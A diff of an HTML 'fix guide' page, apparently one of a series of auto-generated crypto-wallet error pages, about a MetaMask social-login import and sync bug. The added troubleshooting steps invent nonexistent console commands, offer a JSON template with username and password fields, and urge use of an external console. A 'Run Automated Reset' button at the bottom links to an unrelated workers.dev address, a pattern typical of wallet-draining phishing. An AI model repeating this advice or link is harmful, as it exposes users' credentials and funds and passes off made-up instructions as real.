@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,35 +42,35 @@
 <h1>Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users attempting to import their accounts via social login encounter an error, resulting in failed account discovery and synchronization, preventing access to their Ethereum (ETH) wallets within the MetaMask extension.</li>
+<li>Users encounter an error when attempting to import their social login accounts into Metamask, resulting in failed account discovery and synchronization.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration or incompatibility between the social login platform's API and the MetaMask extension, leading to a failure in retrieving and syncing user account data.</li>
+<li>The error occurs due to a bug in the Metamask extension that prevents it from correctly handling social login imports, leading to account discovery and sync issues.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following steps:</li>
-<li>Restart the browser and retry the social login import process.</li>
-<li>Clear the MetaMask extension's storage and cache:</li>
+<li>Attempt to manually reset the Metamask account cache: <code>metamask.clearCache()</code></li>
+<li>Try re-importing the social login account using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;reset&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;clearCache&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">  </span><span class="nt">&quot;provider&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;social-login&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user@example.com&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;password&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <ul>
-<li>Manually configure the API endpoints for social login import in the MetaMask settings.
-For a more in-depth analysis, consider utilizing an external console for direct debugging.</li>
+<li>Force-sync the Metamask account using the Ethereum provider: <code>eth.syncAccount("0x...")</code>
+Consider using an external console to execute these commands for more flexibility.</li>
 </ul>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and updated to the latest version.</li>
-<li>Social login platform account properly configured and connected.</li>
-<li>Ethereum wallet created and accessible outside of the MetaMask extension.</li>
+<li>Metamask extension installed and enabled</li>
+<li>Social login account credentials available</li>
+<li>Ethereum provider configured and connected to the Metamask extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It W</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
